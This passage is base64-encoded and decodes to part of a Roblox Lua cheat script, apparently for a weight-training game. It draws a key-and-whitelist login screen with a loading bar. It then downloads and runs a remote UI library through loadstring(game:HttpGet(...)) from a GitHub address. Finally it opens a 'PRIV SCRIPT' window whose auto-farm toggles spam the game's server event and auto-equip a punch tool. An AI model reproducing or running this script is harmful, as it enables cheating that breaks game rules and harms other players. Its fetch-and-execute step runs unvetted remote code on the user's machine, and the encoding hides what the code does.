SwgICAtLSAjMWEyYTZjDQogICAgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjUsIENvbG9yMy5mcm9tUkdCKDE3OCwgMzEsIDMxKSksIC0tICNiMjFmMWYNCiAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEsIENvbG9yMy5mcm9tUkdCKDI1MywgMTg3LCA0NSkpICAgLS0gI2ZkYmIyZA0KfSkNCnN1YnRpdGxlR3JhZGllbnQuUm90YXRpb24gPSAwDQpzdWJ0aXRsZUdyYWRpZW50LlBhcmVudCA9IHN1YnRpdGxlDQoNCi0tIEFuaW1hdGUgc3VidGl0bGUgZ3JhZGllbnQNCnNwYXduKGZ1bmN0aW9uKCkNCiAgICB3aGlsZSBrZXlHdWkuUGFyZW50IGRvDQogICAgICAgIGZvciBpID0gMzYwLCAwLCAtMyBkbw0KICAgICAgICAgICAgc3VidGl0bGVHcmFkaWVudC5Sb3RhdGlvbiA9IGkNCiAgICAgICAgICAgIHdhaXQoMC4wNSkNCiAgICAgICAgZW5kDQogICAgZW5kDQplbmQpDQoNCmxvY2FsIGtleUJveCA9IEluc3RhbmNlLm5ldygiVGV4dEJveCIpDQprZXlCb3guU2l6ZSA9IFVEaW0yLm5ldygwLjgsIDAsIDAsIDMwKQ0Ka2V5Qm94LlBvc2l0aW9uID0gVURpbTIubmV3KDAuMSwgMCwgMC40NSwgMCkNCmtleUJveC5QbGFjZWhvbGRlclRleHQgPSAiRW50ZXIga2V5Li4uIg0Ka2V5Qm94LlRleHQgPSAiIg0Ka2V5Qm94LkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigzNSwgMzUsIDQwKQ0Ka2V5Qm94LlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQ0Ka2V5Qm94LkZvbnQgPSBFbnVtLkZvbnQuR290aGFtDQprZXlCb3guVGV4dFNpemUgPSAxMg0Ka2V5Qm94LlBhcmVudCA9IGtleUZyYW1lDQoNCmxvY2FsIFVJQ29ybmVyMiA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKQ0KVUlDb3JuZXIyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDUpDQpVSUNvcm5lcjIuUGFyZW50ID0ga2V5Qm94DQoNCmxvY2FsIHN1Ym1pdEJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpDQpzdWJtaXRCdG4uU2l6ZSA9IFVEaW0yLm5ldygwLjgsIDAsIDAsIDMwKQ0Kc3VibWl0QnRuLlBvc2l0aW9uID0gVURpbTIubmV3KDAuMSwgMCwgMC42NSwgMCkNCnN1Ym1pdEJ0bi5UZXh0ID0gIlZFUklGWSBLRVkiDQpzdWJtaXRCdG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIyMSwgMjQsIDI0KQ0Kc3VibWl0QnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQ0Kc3VibWl0QnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZA0Kc3VibWl0QnRuLlRleHRTaXplID0gMTINCnN1Ym1pdEJ0bi5QYXJlbnQgPSBrZXlGcmFtZQ0KDQpsb2NhbCBVSUNvcm5lcjMgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikNClVJQ29ybmVyMy5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA2KQ0KVUlDb3JuZXIzLlBhcmVudCA9IHN1Ym1pdEJ0bg0KDQpsb2NhbCBzdGF0dXMgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpDQpzdGF0dXMuU2l6ZSA9IFVEaW0yLm5ldygwLjgsIDAsIDAsIDE1KQ0Kc3RhdHVzLlBvc2l0aW9uID0gVURpbTIubmV3KDAuMSwgMCwgMC44NSwgMCkNCnN0YXR1cy5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQ0Kc3RhdHVzLlRleHQgPSAiIg0Kc3RhdHVzLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQ0Kc3RhdHVzLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtDQpzdGF0dXMuVGV4dFNpemUgPSAxMA0Kc3RhdHVzLlBhcmVudCA9IGtleUZyYW1lDQoNCi0tIExvYWRpbmcgQmFyIEVsZW1lbnRzIChpbml0aWFsbHkgaGlkZGVuKQ0KbG9jYWwgbG9hZGluZ0JhckJhY2tncm91bmQgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikNCmxvYWRpbmdCYXJCYWNrZ3JvdW5kLlNpemUgPSBVRGltMi5uZXcoMCwgMCwgMCwgMCkgLS0gU3RhcnQgYXMgdGlueSBib3gNCmxvYWRpbmdCYXJCYWNrZ3JvdW5kLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMCwgMC41NSwgMCkgLS0gQ2VudGVyIHBvc2l0aW9uDQpsb2FkaW5nQmFyQmFja2dyb3VuZC5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNDAsIDQwLCA0NSkNCmxvYWRpbmdCYXJCYWNrZ3JvdW5kLlZpc2libGUgPSBmYWxzZQ0KbG9hZGluZ0JhckJhY2tncm91bmQuUGFyZW50ID0ga2V5RnJhbWUNCg0KbG9jYWwgbG9hZGluZ0JhclVJQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpDQpsb2FkaW5nQmFyVUlDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMTApDQpsb2FkaW5nQmFyVUlDb3JuZXIuUGFyZW50ID0gbG9hZGluZ0JhckJhY2tncm91bmQNCg0KbG9jYWwgbG9hZGluZ0JhciA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQ0KbG9hZGluZ0Jhci5TaXplID0gVURpbTIubmV3KDAsIDAsIDEsIDApDQpsb2FkaW5nQmFyLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAsIDApDQpsb2FkaW5nQmFyLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxMDAsIDIwMCwgMjU1KQ0KbG9hZGluZ0Jhci5QYXJlbnQgPSBsb2FkaW5nQmFyQmFja2dyb3VuZA0KDQpsb2NhbCBsb2FkaW5nQmFyQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpDQpsb2FkaW5nQmFyQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDEwKQ0KbG9hZGluZ0JhckNvcm5lci5QYXJlbnQgPSBsb2FkaW5nQmFyDQoNCmxvY2FsIGxvYWRpbmdUZXh0ID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQ0KbG9hZGluZ1RleHQuU2l6ZSA9IFVEaW0yLm5ldygwLjgsIDAsIDAsIDE1KQ0KbG9hZGluZ1RleHQuUG9zaXRpb24gPSBVRGltMi5uZXcoMC4xLCAwLCAwLjcsIDApDQpsb2FkaW5nVGV4dC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQ0KbG9hZGluZ1RleHQuVGV4dCA9ICJWZXJpZnlpbmcgUGxheWVyLi4uIg0KbG9hZGluZ1RleHQuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjAwLCAyNTUpDQpsb2FkaW5nVGV4dC5Gb250ID0gRW51bS5Gb250LkdvdGhhbQ0KbG9hZGluZ1RleHQuVGV4dFNpemUgPSAxMQ0KbG9hZGluZ1RleHQuVmlzaWJsZSA9IGZhbHNlDQpsb2FkaW5nVGV4dC5QYXJlbnQgPSBrZXlGcmFtZQ0KDQpsb2NhbCBwZXJjZW50YWdlVGV4dCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikNCnBlcmNlbnRhZ2VUZXh0LlNpemUgPSBVRGltMi5uZXcoMC44LCAwLCAwLCAxNSkNCnBlcmNlbnRhZ2VUZXh0LlBvc2l0aW9uID0gVURpbTIubmV3KDAuMSwgMCwgMC41NSwgMCkNCnBlcmNlbnRhZ2VUZXh0LkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxDQpwZXJjZW50YWdlVGV4dC5UZXh0ID0gIjAlIg0KcGVyY2VudGFnZVRleHQuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpDQpwZXJjZW50YWdlVGV4dC5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQNCnBlcmNlbnRhZ2VUZXh0LlRleHRTaXplID0gMTINCnBlcmNlbnRhZ2VUZXh0LlZpc2libGUgPSBmYWxzZQ0KcGVyY2VudGFnZVRleHQuUGFyZW50ID0ga2V5RnJhbWUNCg0KLS0gSG92ZXIgZWZmZWN0cw0Kc3VibWl0QnRuLk1vdXNlRW50ZXI6Q29ubmVjdChmdW5jdGlvbigpDQogICAgZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKTpDcmVhdGUoc3VibWl0QnRuLCBUd2VlbkluZm8ubmV3KDAuMiksIHtCYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCA1MCwgNTApfSk6UGxheSgpDQplbmQpDQoNCnN1Ym1pdEJ0bi5Nb3VzZUxlYXZlOkNvbm5lY3QoZnVuY3Rpb24oKQ0KICAgIGdhbWU6R2V0U2VydmljZSgiVHdlZW5TZXJ2aWNlIik6Q3JlYXRlKHN1Ym1pdEJ0biwgVHdlZW5JbmZvLm5ldygwLjIpLCB7QmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIyMSwgMjQsIDI0KX0pOlBsYXkoKQ0KZW5kKQ0KDQotLSBTaGFrZSBmdW5jdGlvbiBmb3Igd3Jvbmcga2V5DQpsb2NhbCBmdW5jdGlvbiBzaGFrZUZyYW1lKCkNCiAgICBsb2NhbCBvcmlnaW5hbFBvc2l0aW9uID0ga2V5RnJhbWUuUG9zaXRpb24NCiAgICBsb2NhbCBzaGFrZUludGVuc2l0eSA9IDUNCiAgICANCiAgICBmb3IgaSA9IDEsIDYgZG8NCiAgICAgICAgbG9jYWwgb2Zmc2V0WCA9IG1hdGgucmFuZG9tKC1zaGFrZUludGVuc2l0eSwgc2hha2VJbnRlbnNpdHkpDQogICAgICAgIGxvY2FsIG9mZnNldFkgPSBtYXRoLnJhbmRvbSgtc2hha2VJbnRlbnNpdHksIHNoYWtlSW50ZW5zaXR5KQ0KICAgICAgICANCiAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKTpDcmVhdGUoDQogICAgICAgICAgICBrZXlGcmFtZSwgDQogICAgICAgICAgICBUd2VlbkluZm8ubmV3KDAuMDUsIEVudW0uRWFzaW5nU3R5bGUuTGluZWFyLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLA0KICAgICAgICAgICAge1Bvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgLTE2MCArIG9mZnNldFgsIDAuNSwgLTEwMCArIG9mZnNldFkpfQ0KICAgICAgICApOlBsYXkoKQ0KICAgICAgICANCiAgICAgICAgd2FpdCgwLjA1KQ0KICAgIGVuZA0KICAgIA0KICAgIC0tIFJldHVybiB0byBvcmlnaW5hbCBwb3NpdGlvbg0KICAgIGdhbWU6R2V0U2VydmljZSgiVHdlZW5TZXJ2aWNlIik6Q3JlYXRlKA0KICAgICAgICBrZXlGcmFtZSwgDQogICAgICAgIFR3ZWVuSW5mby5uZXcoMC4xLCBFbnVtLkVhc2luZ1N0eWxlLkJhY2ssIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksDQogICAgICAgIHtQb3NpdGlvbiA9IG9yaWdpbmFsUG9zaXRpb259DQogICAgKTpQbGF5KCkNCmVuZA0KDQotLSBTVUNDRVNTOiBNYWtlIGJvcmRlciBncmVlbiB0ZW1wb3JhcmlseQ0KbG9jYWwgZnVuY3Rpb24gZmxhc2hTdWNjZXNzQm9yZGVyKCkNCiAgICBsb2NhbCBvcmlnaW5hbENvbG9ycyA9IHsNCiAgICAgICAgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLCBDb2xvcjMuZnJvbVJHQig1MSwgNTEsIDUxKSksDQogICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMSwgQ29sb3IzLmZyb21SR0IoMjIxLCAyNCwgMjQpKQ0KICAgIH0NCiAgICANCiAgICAtLSBGbGFzaCBncmVlbg0KICAgIGdyYWRpZW50LkNvbG9yID0gQ29sb3JTZXF1ZW5jZS5uZXcoew0KICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAsIENvbG9yMy5mcm9tUkdCKDUwLCAyMDAsIDUwKSksDQogICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMSwgQ29sb3IzLmZyb21SR0IoMTAwLCAyNTUsIDEwMCkpDQogICAgfSkNCiAgICANCiAgICB3YWl0KDAuOCkNCiAgICANCiAgICAtLSBSZXR1cm4gdG8gb3JpZ2luYWwgY29sb3JzDQogICAgZ3JhZGllbnQuQ29sb3IgPSBDb2xvclNlcXVlbmNlLm5ldyhvcmlnaW5hbENvbG9ycykNCmVuZA0KDQotLSBTaHJpbmsgZWxlbWVudHMgaW50byBsb2FkaW5nIGJveA0KbG9jYWwgZnVuY3Rpb24gc2hyaW5rSW50b0xvYWRpbmdCb3goKQ0KICAgIGxvY2FsIHR3ZWVuU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiVHdlZW5TZXJ2aWNlIikNCiAgICANCiAgICAtLSBNYWtlIGxvYWRpbmcgYm94IHZpc2libGUgYnV0IHRpbnkNCiAgICBsb2FkaW5nQmFyQmFja2dyb3VuZC5WaXNpYmxlID0gdHJ1ZQ0KICAgIGxvYWRpbmdCYXJCYWNrZ3JvdW5kLlNpemUgPSBVRGltMi5uZXcoMCwgMCwgMCwgMCkNCiAgICBsb2FkaW5nQmFyQmFja2dyb3VuZC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNTUsIDApDQogICAgDQogICAgLS0gS2V5Qm94IHNocmlua3MgdG8gY2VudGVyIGFuZCBmYWRlcw0KICAgIGxvY2FsIGtleUJveFNocmluayA9IHR3ZWVuU2VydmljZTpDcmVhdGUoDQogICAgICAgIGtleUJveCwNCiAgICAgICAgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuQmFjaywgRW51bS5FYXNpbmdEaXJlY3Rpb24uSW4pLA0KICAgICAgICB7DQogICAgICAgICAgICBTaXplID0gVURpbTIubmV3KDAsIDAsIDAsIDApLA0KICAgICAgICAgICAgUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAwLCAwLjU1LCAwKSwNCiAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxLA0KICAgICAgICAgICAgVGV4dFRyYW5zcGFyZW5jeSA9IDENCiAgICAgICAgfQ0KICAgICkNCiAgICANCiAgICAtLSBTdWJtaXRCdG4gc2hyaW5rcyB0byBjZW50ZXIgYW5kIGZhZGVzDQogICAgbG9jYWwgc3VibWl0QnRuU2hyaW5rID0gdHdlZW5TZXJ2aWNlOkNyZWF0ZSgNCiAgICAgICAgc3VibWl0QnRuLA0KICAgICAgICBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5CYWNrLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5JbiksDQogICAgICAgIHsNCiAgICAgICAgICAgIFNpemUgPSBVRGltMi5uZXcoMCwgMCwgMCwgMCksDQogICAgICAgICAgICBQb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNTUsIDApLA0KICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEsDQogICAgICAgICAgICBUZXh0VHJhbnNwYXJlbmN5ID0gMQ0KICAgICAgICB9DQogICAgKQ0KICAgIA0KICAgIC0tIFBsYXkgc2hyaW5rIGFuaW1hdGlvbnMNCiAgICBrZXlCb3hTaHJpbms6UGxheSgpDQogICAgc3VibWl0QnRuU2hyaW5rOlBsYXkoKQ0KICAgIA0KICAgIHdhaXQoMC42KQ0KICAgIA0KICAgIC0tIE5vdyBleHBhbmQgdGhlIGxvYWRpbmcgYm94IGludG8gZnVsbCBsb2FkaW5nIGJhcg0KICAgIGxvY2FsIGV4cGFuZEJveCA9IHR3ZWVuU2VydmljZTpDcmVhdGUoDQogICAgICAgIGxvYWRpbmdCYXJCYWNrZ3JvdW5kLA0KICAgICAgICBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FbGFzdGljLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLA0KICAgICAgICB7DQogICAgICAgICAgICBTaXplID0gVURpbTIubmV3KDAuOCwgMCwgMCwgMjApLA0KICAgICAgICAgICAgUG9zaXRpb24gPSBVRGltMi5uZXcoMC4xLCAwLCAwLjQ1LCAwKQ0KICAgICAgICB9DQogICAgKQ0KICAgIA0KICAgIGV4cGFuZEJveDpQbGF5KCkNCiAgICANCiAgICB3YWl0KDAuNykNCmVuZA0KDQotLSBMb2FkaW5nIGJhciBhbmltYXRpb24NCmxvY2FsIGZ1bmN0aW9uIGFuaW1hdGVMb2FkaW5nQmFyKCkNCiAgICBsb2FkaW5nVGV4dC5WaXNpYmxlID0gdHJ1ZQ0KICAgIHBlcmNlbnRhZ2VUZXh0LlZpc2libGUgPSB0cnVlDQogICAgDQogICAgLS0gRmFkZSBpbiB0ZXh0IGVsZW1lbnRzDQogICAgbG9hZGluZ1RleHQuVGV4dFRyYW5zcGFyZW5jeSA9IDENCiAgICBwZXJjZW50YWdlVGV4dC5UZXh0VHJhbnNwYXJlbmN5ID0gMQ0KICAgIA0KICAgIGdhbWU6R2V0U2VydmljZSgiVHdlZW5TZXJ2aWNlIik6Q3JlYXRlKA0KICAgICAgICBsb2FkaW5nVGV4dCwNCiAgICAgICAgVHdlZW5JbmZvLm5ldygwLjQsIEVudW0uRWFzaW5nU3R5bGUuUXVhZCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwNCiAgICAgICAge1RleHRUcmFuc3BhcmVuY3kgPSAwfQ0KICAgICk6UGxheSgpDQogICAgDQogICAgZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKTpDcmVhdGUoDQogICAgICAgIHBlcmNlbnRhZ2VUZXh0LA0KICAgICAgICBUd2VlbkluZm8ubmV3KDAuNCwgRW51bS5FYXNpbmdTdHlsZS5RdWFkLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLA0KICAgICAgICB7VGV4dFRyYW5zcGFyZW5jeSA9IDB9DQogICAgKTpQbGF5KCkNCiAgICANCiAgICB3YWl0KDAuNSkNCiAgICANCiAgICAtLSBTdGFydCBsb2FkaW5nIHByb2dyZXNzDQogICAgbG9jYWwgdG90YWxUaW1lID0gMi41IC0tIDIuNSBzZWNvbmRzIHRvdGFsDQogICAgbG9jYWwgc3RlcHMgPSAxMDANCiAgICBsb2NhbCBzdGVwVGltZSA9IHRvdGFsVGltZSAvIHN0ZXBzDQogICAgDQogICAgZm9yIGkgPSAwLCBzdGVwcyBkbw0KICAgICAgICBsb2NhbCBwcm9ncmVzcyA9IGkgLyBzdGVwcw0KICAgICAgICBsb2FkaW5nQmFyLlNpemUgPSBVRGltMi5uZXcocHJvZ3Jlc3MsIDAsIDEsIDApDQogICAgICAgIHBlcmNlbnRhZ2VUZXh0LlRleHQgPSBtYXRoLmZsb29yKHByb2dyZXNzICogMTAwKSAuLiAiJSINCiAgICAgICAgDQogICAgICAgIC0tIENoYW5nZSBjb2xvciBiYXNlZCBvbiBwcm9ncmVzcw0KICAgICAgICBpZiBwcm9ncmVzcyA8IDAuMzMgdGhlbg0KICAgICAgICAgICAgbG9hZGluZ0Jhci5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCA4MCwgODApIC0tIFJlZA0KICAgICAgICBlbHNlaWYgcHJvZ3Jlc3MgPCAwLjY2IHRoZW4NCiAgICAgICAgICAgIGxvYWRpbmdCYXIuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMTgwLCA2MCkgLS0gT3JhbmdlDQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIGxvYWRpbmdCYXIuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDEwMCwgMjU1LCAxMDApIC0tIEdyZWVuDQogICAgICAgIGVuZA0KICAgICAgICANCiAgICAgICAgd2FpdChzdGVwVGltZSkNCiAgICBlbmQNCmVuZA0KDQotLSBDaGVjayBpZiB1c2VyIGlzIHdoaXRlbGlzdGVkDQpsb2NhbCBmdW5jdGlvbiBpc1VzZXJXaGl0ZWxpc3RlZCgpDQogICAgbG9jYWwgcGxheWVyTmFtZSA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5OYW1lOmxvd2VyKCkNCiAgICBmb3IgXywgd2hpdGVsaXN0ZWROYW1lIGluIGlwYWlycyh3aGl0ZWxpc3RlZFVzZXJzKSBkbw0KICAgICAgICBpZiBwbGF5ZXJOYW1lID09IHdoaXRlbGlzdGVkTmFtZTpsb3dlcigpIHRoZW4NCiAgICAgICAgICAgIHJldHVybiB0cnVlDQogICAgICAgIGVuZA0KICAgIGVuZA0KICAgIHJldHVybiBmYWxzZQ0KZW5kDQoNCi0tIEJ1dHRvbiBjbGljayBmdW5jdGlvbg0KbG9jYWwgZnVuY3Rpb24gdmVyaWZ5S2V5KCkNCiAgICBsb2NhbCBlbnRlcmVkS2V5ID0ga2V5Qm94LlRleHQ6Z3N1YigiJXMrIiwgIiIpOnVwcGVyKCkNCiAgICBsb2NhbCBpc1doaXRlbGlzdGVkID0gaXNVc2VyV2hpdGVsaXN0ZWQoKQ0KICAgIGxvY2FsIGtleVZhbGlkID0gZmFsc2UNCiAgICANCiAgICAtLSBDaGVjayBpZiBrZXkgaXMgdmFsaWQNCiAgICBmb3IgXywgdmFsaWRLZXkgaW4gcGFpcnModmFsaWRLZXlzKSBkbw0KICAgICAgICBpZiBlbnRlcmVkS2V5ID09IHZhbGlkS2V5IHRoZW4NCiAgICAgICAgICAgIGtleVZhbGlkID0gdHJ1ZQ0KICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgZW5kDQogICAgZW5kDQogICAgDQogICAgaWYgaXNXaGl0ZWxpc3RlZCBhbmQga2V5VmFsaWQgdGhlbg0KICAgICAgICAtLSBXaGl0ZWxpc3RlZCB1c2VyIHdpdGggY29ycmVjdCBrZXkgLSBTSFJJTksgVE8gTE9BRElORyBCT1gNCiAgICAgICAgZmxhc2hTdWNjZXNzQm9yZGVyKCkgLS0gR1JFRU4gQk9SREVSIEZMQVNIDQogICAgICAgIHNocmlua0ludG9Mb2FkaW5nQm94KCkNCiAgICAgICAgDQogICAgICAgIC0tIFN0YXJ0IGxvYWRpbmcgYW5pbWF0aW9uDQogICAgICAgIGFuaW1hdGVMb2FkaW5nQmFyKCkNCiAgICAgICAgDQogICAgICAgIC0tIFdhaXQgZm9yIGxvYWRpbmcgdG8gY29tcGxldGUNCiAgICAgICAgd2FpdCgwLjUpDQogICAgICAgIA0KICAgICAgICAtLSBTaG93IGZpbmFsIHJlc3VsdA0KICAgICAgICBsb2FkaW5nVGV4dC5UZXh0ID0gIuKchSBXaGl0ZWxpc3RlZCAtIEFjY2VzcyBHcmFudGVkISINCiAgICAgICAgbG9hZGluZ1RleHQuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDEwMCwgMjU1LCAxMDApDQogICAgICAgIHBlcmNlbnRhZ2VUZXh0LlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxMDAsIDI1NSwgMTAwKQ0KICAgICAgICANCiAgICAgICAgd2FpdCgxLjUpDQogICAgICAgIGtleUd1aTpEZXN0cm95KCkNCiAgICAgICAgDQotLSBMb2FkIFVJIExpYnJhcnkNCmxvY2FsIExpYnJhcnkgPSBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0R5bGFubm42OS9TSEVTSExMTExMTEwxMjNQUk9URUNURUQvcmVmcy9oZWFkcy9tYWluL0xpYnJhcnkubHVhIikpKCkNCg0KLS0gQ3JlYXRlIE1haW4gV2luZG93DQpsb2NhbCBXaW5kb3cgPSBMaWJyYXJ5OldpbmRvdyh7DQogICAgVGl0bGUgPSAiQVBYIHx8IFBSSVYgU0NSSVBUIOKAlCBIZWxsbyAiIC4uIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5EaXNwbGF5TmFtZSwNCiAgICBEZXNjID0gIkJ5IDogRHlsYW4iLA0KICAgIEljb24gPSBob3VzZSwNCiAgICBUaGVtZSA9ICJEYXJrIiwNCiAgICBDb25maWcgPSB7DQogICAgICAgIEtleWJpbmQgPSBFbnVtLktleUNvZGUuTGVmdENvbnRyb2wsDQogICAgICAgIFNpemUgPSBVRGltMi5uZXcoMCwgNTAwLCAwLCA0MDApDQogICAgfSwNCiAgICBDbG9zZVVJQnV0dG9uID0gew0KICAgICAgICBFbmFibGVkID0gdHJ1ZSwNCiAgICAgICAgVGV4dCA9ICJPcGVuL0Nsb3NlIg0KICAgIH0NCn0pDQoNCi0tIFNpZGViYXIgVmVydGljYWwgU2VwYXJhdG9yDQpsb2NhbCBTaWRlYmFyTGluZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQ0KU2lkZWJhckxpbmUuU2l6ZSA9IFVEaW0yLm5ldygwLCAxLCAxLCAwKQ0KU2lkZWJhckxpbmUuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMTQwLCAwLCAwKQ0KU2lkZWJhckxpbmUuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDYwLCA2MCwgNjApDQpTaWRlYmFyTGluZS5Cb3JkZXJTaXplUGl4ZWwgPSAwDQpTaWRlYmFyTGluZS5aSW5kZXggPSA1DQpTaWRlYmFyTGluZS5OYW1lID0gIlNpZGViYXJMaW5lIg0KU2lkZWJhckxpbmUuUGFyZW50ID0gZ2FtZTpHZXRTZXJ2aWNlKCJDb3JlR3VpIikNCg0KDQpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikNCmxvY2FsIHBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXINCmxvY2FsIHJTdG8gPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikgDQpsb2NhbCBzbmFja3MgPSB7IlRPVUdIIEJhciIsICJQcm90ZWluIFNoYWtlIiwgIlByb3RlaW4gQmFyIiwgIlVMVFJBIFNoYWtlIiwgIkVuZXJneSBTaGFrZSIsICJFbmVyZ3kgQmFyIiwgIlRyb3BpY2FsIFNoYWtlIn0NCmxvY2FsIHByb3RlaW5FZ2dOYW1lID0gIlByb3RlaW4gRWdnIg0KbG9jYWwgZGVsYXlUaW1lID0gMjkgKiA2MCArIDMwIC0tIDI5IG1pbnV0ZXMgMzAgc2Vjb25kcw0KICAgICAgICANCi0tIEZhcm0gT1AgVGFiDQpsb2NhbCBBdXRvRmFybSA9IFdpbmRvdzpUYWIoe1RpdGxlID0gIkZhcm0gT1AiLCBJY29uID0gImR1bWJiZWxsIn0pDQoNCi0tIEZhcm0gVG9vbHMgU2VjdGlvbg0KQXV0b0Zhcm06U2VjdGlvbih7VGl0bGUgPSAiRkFSTSBUT09MUyJ9KQ0KDQpBdXRvRmFybTpUb2dnbGUoew0KICAgIFRpdGxlID0gIkF1dG9GYXJtIHdlaWdodHMiLA0KICAgIERlc2MgPSAiRXF1aXAgYW55IGZhcm1pbmcgdG9vbHMiLA0KICAgIFZhbHVlID0gZmFsc2UsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkNCiAgICAgICAgd2hpbGUgc3RhdGUgZG8NCiAgICAgICAgICAgIGxvY2FsIGFyZ3MgPSB7WzFdID0gInJlcCJ9DQogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkgIA0KICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikuUmVuZGVyU3RlcHBlZDpXYWl0KCkgIA0KICAgICAgICBlbmQNCiAgICBlbmQNCn0pDQoNCi0tIEZhc3QgUHVuY2gNCmxvY2FsIGZ1bmN0aW9uIGF1dG9GYXN0UHVuY2goKQ0KICAgIGxvY2FsIHBsYXllciA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyDQogICAgd2hpbGUgX0cuZmFzdFB1bmNoIGRvDQogICAgICAgIGxvY2FsIHB1bmNoVG9vbCA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQ0KICAgICAgICBpZiBwdW5jaFRvb2wgdGhlbg0KICAgICAgICAgICAgcHVuY2hUb29sLlBhcmVudCA9IHBsYXllci5DaGFyYWN0ZXINCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpDQogICAgICAgIGVuZA0KDQogICAgI